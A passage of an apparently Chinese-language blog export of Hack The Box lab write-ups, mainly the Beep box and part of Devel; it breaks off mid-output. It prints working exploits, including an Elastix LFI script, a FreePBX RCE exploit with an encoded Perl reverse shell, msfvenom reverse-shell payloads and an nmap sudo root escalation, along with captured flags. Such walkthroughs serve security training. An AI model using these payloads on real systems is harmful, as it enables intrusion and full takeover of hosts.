'c:\\Users\\kostas\\Desktop\\user.txt.txt'\nd0c39409d7b994a9a1389ebf38ef5f73\n```\n```bash\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\n51ed1b36553c8461f4552c2e92b3eeed\n```\n成功拿到user和root权限的flag文件","tags":["Hackthebox"]},{"title":"Beep - Hackthebox","url":"/2022/03/09/Hackthebox/Easy/Hackthebox-Beep/","content":"\n# Hackthebox - Beep\n## 靶场信息\n![](Hackthebox-Beep/cc3689db-67a4-4544-82f9-b0aabeb80f7c.png)\n\n## 靶场类型\n![](Hackthebox-Beep/d82d05cf-780c-4857-93e6-4891dab2a9af.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7       \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 00:36 EST\nNmap scan report for 10.10.10.7\nHost is up (6.6s latency).\nNot shown: 64293 filtered ports, 1232 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  tcpwrapped\n| ssh-hostkey: \n|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)\n|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)\n25/tcp   open  tcpwrapped\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n80/tcp   open  tcpwrapped\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n110/tcp  open  tcpwrapped\n|_pop3-capabilities: STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) TOP UIDL USER AUTH-RESP-CODE APOP\n111/tcp  open  tcpwrapped\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            875/udp   status\n|_  100024  1            878/tcp   status\n143/tcp  open  tcpwrapped\n|_imap-capabilities: THREAD=ORDEREDSUBJECT NAMESPACE OK MULTIAPPEND X-NETSCAPE QUOTA NO URLAUTHA0001 LISTEXT LIST-SUBSCRIBED CATENATE BINARY ID IDLE RIGHTS=kxte ANNOTATEMORE STARTTLS IMAP4 SORT=MODSEQ Completed IMAP4rev1 ACL UNSELECT RENAME UIDPLUS ATOMIC THREAD=REFERENCES MAILBOX-REFERRALS LITERAL+ CONDSTORE SORT CHILDREN\n443/tcp  open  tcpwrapped\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2017-04-07T08:22:08\n|_Not valid after:  2018-04-07T08:22:08\n|_ssl-date: 2022-03-04T06:40:08+00:00; +59m59s from scanner time.\n993/tcp  open  tcpwrapped\n|_imap-capabilities: CAPABILITY\n995/tcp  open  tcpwrapped\n3306/tcp open  tcpwrapped\n|_sslv2: ERROR: Script execution failed (use -d to debug)\nDevice type: firewall\nRunning (JUST GUESSING): Fortinet embedded (87%)\nOS CPE: cpe:/h:fortinet:fortigate_100d\nAggressive OS guesses: Fortinet FortiGate 100D firewall (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 4 hops\n\nHost script results:\n|_clock-skew: 59m55s\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT        ADDRESS\n1   5559.01 ms 10.10.16.1\n2   ... 3\n4   5559.05 ms 10.10.10.7\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 460.47 seconds\n```\n### Http\n先来看看80端口的web服务\n\n![](Hackthebox-Beep/2f3a5383-ded3-4a6e-b4ee-b56f6c7448f3.png)\n\n是一个Elastix的系统，去搜搜看是否有漏洞\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit elastix                   \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nElastix - 'page' Cross-Site Scripting                                                                                                                                             | php/webapps/38078.py\nElastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                           | php/webapps/38544.txt\nElastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                     | php/webapps/34942.txt\nElastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                  | php/webapps/37637.pl\nElastix 2.x - Blind SQL Injection                                                                                                                                                 | php/webapps/36305.txt\nElastix < 2.5 - PHP Code Injection                                                                                                                                                | php/webapps/38091.php\nFreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这里可以看到有几个漏洞，其中一个是LFI（远程文件包含），去看看相关漏洞内容\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# locate php/webapps/37637.pl\n/usr/share/exploitdb/exploits/php/webapps/37637.pl\n\n┌──(root💀kali)-[~/Desktop]\n└─# cat /usr/share/exploitdb/exploits/php/webapps/37637.pl\nsource: https://www.securityfocus.com/bid/55078/info\n\nElastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.\n\nAn attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.\n\nElastix 2.2.0 is vulnerable; other versions may also be affected. \n\n#!/usr/bin/perl -w\n\n#------------------------------------------------------------------------------------# \n#Elastix is an Open Source Sofware to establish Unified Communications. \n#About this concept, Elastix goal is to incorporate all the communication alternatives,\n#available at an enterprise level, into a unique solution.\n#------------------------------------------------------------------------------------#\n############################################################\n# Exploit Title: Elastix 2.2.0 LFI\n# Google Dork: :(\n# Author: cheki\n# Version:Elastix 2.2.0\n# Tested on: multiple\n# CVE : notyet\n# romanc-_-eyes ;) \n# Discovered by romanc-_-eyes\n# vendor http://www.elastix.org/\n\nprint \"\\t Elastix 2.2.0 LFI Exploit \\n\";\nprint \"\\t code author cheki   \\n\";\nprint \"\\t 0day Elastix 2.2.0  \\n\";\nprint \"\\t email: anonymous17hacker{}gmail.com \\n\";\n\n#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\n\nuse LWP::UserAgent;\nprint \"\\n Target: https://ip \";\nchomp(my $target=<STDIN>);\n$dir=\"vtigercrm\";\n$poc=\"current_language\";\n$etc=\"etc\";\n$jump=\"../../../../../../../..//\";\n$test=\"amportal.conf%00\";\n\n$code = LWP::UserAgent->new() or die \"inicializacia brauzeris\\n\";\n$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\n$host = $target . \"/\".$dir.\"/graph.php?\".$poc.\"=\".$jump.\"\".$etc.\"/\".$test.\"&module=Accounts&action\";\n$res = $code->request(HTTP::Request->new(GET=>$host));\n$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {\n\nprint \"\\n read amportal.conf file : $answer \\n\\n\";\nprint \" successful read\\n\";\n\n}\nelse { \nprint \"\\n[-] not successful\\n\";\n        }\n```\n## 漏洞利用\n根据Exploit中提到的，构造一个任意文件读取的Payload\n\n```bash\nview-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\n```\n![](Hackthebox-Beep/d26765f5-20c7-4005-83a8-1d66a513cb38.png)\n\n成功读取到一个账号密码\n\n```bash\nusername = admin\npassword = jEhdIekWmdjE\n```\n我们去尝试登录一下\n\n![](Hackthebox-Beep/f457f5cd-5496-4784-a724-93f1f240e343.png)\n\n登入后似乎是一个仪表盘，但没什么可以利用的\n\n![](Hackthebox-Beep/dae9ef78-668f-409f-ac5b-bad9f4e0dbaa.png)\n\n经过尝试后发现/admin目录是一个另外的登录口，也可使用这个账号密码进行登录\n\n但登入后也没看到什么明显的利用点\n\n这边倒是可以直接使用ssh进行登录，先给大家演示一下直接登录的方法，再演示其他的利用方式\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh root@10.10.10.7                                                       \nUnable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n```\n这边提示需要指定kex算法，去指定一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh root@10.10.10.7 -o KexAlgorithms=diffie-hellman-group1-sha1                                                                                                                                           255 ⨯\nThe authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.\nRSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.\nroot@10.10.10.7's password: \nLast login: Tue Jul 16 11:45:47 2019\n\nWelcome to Elastix \n----------------------------------------------------\n\nTo access your Elastix System, using a separate workstation (PC/MAC/Linux)\nOpen the Internet Browser using the following URL:\nhttp://10.10.10.7\n\n[root@beep ~]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n可以直接使用网页中获取到的密码进行登录，不过这种猜密码是否可以利用的方式显然不符合我的想法，还是得测试漏洞\n\n![](Hackthebox-Beep/94e68a76-7657-4b88-9493-b1caab5ab50e.png)\n\n进入https://10.10.10.7/admin然后取消登录框，即可看到FreePBX的版本，去searchspolit一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit FreePBX\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nFreePBX - 'config.php' Remote Code Execution (Metasploit)                                                                                                                         | unix/remote/32512.rb\nFreePBX 13 - Remote Command Execution / Privilege Escalation                                                                                                                      | php/webapps/40614.py\nFreePBX 13.0.35 - Remote Command Execution                                                                                                                                        | php/webapps/40296.txt\nFreePBX 13.0.35 - SQL Injection                                                                                                                                                   | php/webapps/40312.txt\nFreePBX 13.0.x < 13.0.154 - Remote Command Execution                                                                                                                              | php/webapps/40345.txt\nFreePBX 13/14 - Remote Command Execution / Privilege Escalation                                                                                                                   | linux/remote/40232.py\nFreePBX 2.1.3 - 'upgrade.php' Remote File Inclusion                                                                                                                               | php/webapps/2665.txt\nFreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py\nFreePBX 2.11.0 - Remote Command Execution                                                                                                                                         | php/webapps/32214.pl\nFreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities                                                                                                                  | multiple/remote/29873.php\nFreePBX 2.5.1 - SQL Injection                                                                                                                                                     | multiple/webapps/11186.txt\nFreePBX 2.5.2 - '/admin/config.php?tech' Cross-Site Scripting                                                                                                                     | php/webapps/33442.txt\nFreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting                                                                                                   | php/webapps/33443.txt\nFreePBX 2.5.x - Information Disclosure                                                                                                                                            | multiple/webapps/11187.txt\nFreePBX 2.5.x < 2.6.0 - Persistent Cross-Site Scripting                                                                                                                           | multiple/webapps/11184.txt\nFreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution                                                                                                                 | php/webapps/15098.txt\nFreePBX 2.9.0/2.10.0 - 'callmenum' Remote Code Execution (Metasploit)                                                                                                             | php/webapps/18659.rb\nFreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities                                                                                                                                   | php/webapps/18649.txt\nFreePBX < 13.0.188 - Remote Command Execution (Metasploit)                                                                                                                        | php/remote/40434.rb\nFreepbx < 2.11.1.5 - Remote Code Execution                                                                                                                                        | php/webapps/41005.txt\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这里可以看到有一个RCE的漏洞 php/webapps/18650.py 咱们去查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]\n└─# cat exploit.py \n#!/usr/bin/python\n############################################################\n# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit\n# Google Dork: oy vey\n# Date: March 23rd, 2012\n# Author: muts\n# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.\n# Tested on: multiple\n# CVE : notyet\n# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ \n# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt\n############################################################\n# Discovered by Martin Tschirsich\n# http://seclists.org/fulldisclosure/2012/Mar/234\n# http://www.exploit-db.com/exploits/18649\n############################################################\nimport urllib\nrhost=\"172.16.254.72\"\nlhost=\"172.16.254.223\"\nlport=443\nextension=\"1000\"\n\n# Reverse shell payload\n\nurl = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'\n\nurllib.urlopen(url)\n\n# On Elastix, once we have a shell, we can escalate to root:\n# root@bt:~# nc -lvp 443\n# listening on [any] 443 ...\n# connect to [172.16.254.223] from voip [172.16.254.72] 43415\n# id\n# uid=100(asterisk) gid=101(asterisk)\n# sudo nmap --interactive\n\n# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\n# Welcome to Interactive Mode -- press h <enter> for help\n# nmap> !sh\n# id\n# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n稍微做一下修改\n\n```bash\nrhost=\"10.10.10.7\"\nlhost=\"10.10.16.2\"\nlport=4444\nextension=\"1000\"\n```\n修改好以后去执行试试\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]\n└─# python exploit.py \nTraceback (most recent call last):\n  File \"exploit.py\", line 27, in <module>\n    urllib.urlopen(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 87, in urlopen\n    return opener.open(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 215, in open\n    return getattr(self, name)(url)\n  File \"/usr/lib/python2.7/urllib.py\", line 445, in open_https\n    h.endheaders(data)\n  File \"/usr/lib/python2.7/httplib.py\", line 1078, in endheaders\n    self._send_output(message_body)\n  File \"/usr/lib/python2.7/httplib.py\", line 894, in _send_output\n    self.send(msg)\n  File \"/usr/lib/python2.7/httplib.py\", line 856, in send\n    self.connect()\n  File \"/usr/lib/python2.7/httplib.py\", line 1303, in connect\n    server_hostname=server_hostname)\n  File \"/usr/lib/python2.7/ssl.py\", line 369, in wrap_socket\n    _context=self)\n  File \"/usr/lib/python2.7/ssl.py\", line 599, in __init__\n    self.do_handshake()\n  File \"/usr/lib/python2.7/ssl.py\", line 828, in do_handshake\n    self._sslobj.do_handshake()\nIOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)\n```\n这边urllib报错了，想个办法，给删掉改成print输出手动执行试试\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]\n└─# python exploit.py \nhttps://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\n```\n去浏览器里访问一下\n\n去访问后这一段没有弹回shell，去找一下原因\n\n排查后发现应该是extension的问题，去查找一下正确的extension\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# svwar -m INVITE -e200-300 10.10.10.7\nWARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nWARNING:TakeASip:extension '239' probably exists but the response is unexpected\nWARNING:TakeASip:extension '241' probably exists but the response is unexpected\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\nERROR:TakeASip:could not decode to tag\n+-----------+----------------+\n| Extension | Authentication |\n+===========+================+\n| 233       | reqauth        |\n+-----------+----------------+\n| 239       | weird          |\n+-----------+----------------+\n| 241       | weird          |\n+-----------+----------------+\n```\n正确的是233，咱们去exploit里修改一下，然后重新生成\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]\n└─# python exploit.py\nhttps://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\n```\n再去试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 46340\npython -c \"import pty;pty.spawn('/bin/bash')\"\nbash-3.2$ whoami&&id\nwhoami&&id\nasterisk\nuid=100(asterisk) gid=101(asterisk)\n```\n成功拿到user权限\n\n```bash\nbash-3.2$ cd /home\ncd /home\nbash-3.2$ ls\nls\nfanis  spamfilter\nbash-3.2$ cd fanis\ncd fanis\nbash-3.2$ ls\nls\nuser.txt\nbash-3.2$ cat user.txt\ncat user.txt\ne6da504f44f4d004da91498eec298b24\n```\n成功拿到user权限的flag文件\n\n## 权限提升\n```bash\n# On Elastix, once we have a shell, we can escalate to root:\n# root@bt:~# nc -lvp 443\n# listening on [any] 443 ...\n# connect to [172.16.254.223] from voip [172.16.254.72] 43415\n# id\n# uid=100(asterisk) gid=101(asterisk)\n# sudo nmap --interactive\n\n# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\n# Welcome to Interactive Mode -- press h <enter> for help\n# nmap> !sh\n# id\n# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n按照exploit里提示的进行提权试试\n\n```bash\nbash-3.2$ sudo nmap --interactive\nsudo nmap --interactive\n\nStarting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )\nWelcome to Interactive Mode -- press h <enter> for help\nnmap> !sh\n!sh\nsh-3.2# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n```\n成功拿到root权限\n\n```bash\nsh-3.2# cd /root\ncd /root\nsh-3.2# ls\nls\nanaconda-ks.cfg            install.log.syslog  webmin-1.570-1.noarch.rpm\nelastix-pr-2.2-1.i386.rpm  postnochroot\ninstall.log                root.txt\nsh-3.2# cat root.txt\ncat root.txt\n493be6af70ce6780ee96432618649fe4\n```\n成功拿到root权限的flag文件\n\n咱们看一下原理\n\n```bash\nsh-3.2# sudo -l\nsudo -l\nMatching Defaults entries for root on this host:\n    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR\n    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE\n    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC\n    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET\n    XAUTHORITY\"\n\nUser root may run the following commands on this host:\n    (ALL) ALL\n```\n这里可以执行的权限还挺多的","tags":["Hackthebox"]},{"title":"Devel - Hackthebox","url":"/2022/03/03/Hackthebox/Easy/Hackthebox-Devel/","content":"\n# Hackthebox - Devel\n## 靶场信息\n![](Hackthebox-Devel/e3ca3013-fa7c-4025-9bbd-3a42f1a2b731.png)\n\n## 靶场类型\n![](Hackthebox-Devel/3ad2d2c5-f8af-42b7-9752-a8051edff749.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.5                                                                                                                                                        130 ⨯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-03 02:16 EST\nNmap scan report for 10.10.10.5\nHost is up (0.70s latency).\nNot shown: 65533 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 03-18-17  01:06AM       <DIR>          aspnet_client\n| 03-17-17  04:37PM                  689 iisstart.htm\n|_03-17-17  04:37PM               184946 welcome.png\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: IIS7\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   934.01 ms 10.10.16.1\n2   934.05 ms 10.10.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.29 seconds\n```\n## Http\n先去看看80端口的web服务\n\n![](Hackthebox-Devel/44891644-3ea8-40c1-8d4c-86d46f00ffd9.png)\n\n就是一个普通的IIS页面，没什么可看的\n\n### FTP\nFTP可以看到有两个文件，并且可以匿名登录\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel]\n└─# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> dir\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       <DIR>          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-17-17  04:37PM               184946 welcome.png\n226 Transfer complete.\n```\n这里看到两个文件，似乎和80端口的是一样的\n\n去本地创建个文件传上去试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# echo \"I'm Lucifiel\" > test.html\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> put test.html \nlocal: test.html remote: test.html\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n226 Transfer complete.\n14 bytes sent in 0.00 secs (303.8194 kB/s)\nftp> ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       <DIR>          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-03-22  09:29AM                   14 test.html\n03-17-17  04:37PM               184946 welcome.png\n226 Transfer complete.\n```\n成功传上去了，咱们去访问看看有没有\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://10.10.10.5/test.html                                                                                   \nI'm Lucifiel\n```\nOK，传上去了，证明猜想没错，那就简单了，去生成个马传上去吧\n\n## 漏洞利用\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx -o shell.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of aspx file: 2901 bytes\nSaved as: shell.aspx\n```\n使用msf生成一个aspx的木马\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ftp 10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\nName (10.10.10.5:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp> put shell.aspx\nlocal: shell.aspx remote: shell.aspx\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n226 Transfer complete.\n2938 bytes sent in 0.00 secs (58.3728 MB/s)\n```\n然后使用ftp传上去\n\n```bash\nmsf6 > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 > use exploit/multi/handler\n[*] Using configured payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 10.10.16.2\nlhost => 10.10.16.2\nmsf6 exploit(multi/handler) > set lport 4444\nlport => 4444\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444\n```\n然后使用msf开启端口监听\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Devel]\n└─# curl http://10.10.10.5/shell.aspx\n```\n然后访问我们上传的aspx马\n\n```bash\nmsf6 exploit(multi/handler) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Sending stage (175174 bytes) to 10.10.10.5\n[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.5:49162) at 2022-03-03 02:37:15 -0500\n\nmeterpreter > getuid\nServer username: IIS APPPOOL\\Web\nmeterpreter > sysinfo\nComputer        : DEVEL\nOS              : Windows 7 (6.1 Build 7600).\nArchitecture    : x86\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 2\nMeterpreter     : x86/windows\n```\n成功拿到shell\n\n## 权限提升\n```bash\nmeterpreter > background \n[*] Backgrounding session 1...\nmsf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester\n[*] Using configured payload windows/meterpreter/reverse_tcp\nmsf6 post(multi/recon/local_exploit_suggester) > set session 1\nsession => 1\nmsf6 post(multi/recon/local_exploit_suggester) > exploit \n\n[*] 10.10.10.5 - Collecting local exploits for x86/windows...\n[*] 10.10.10.5 - 38 exploit checks are being tried...\n[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.\n[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be 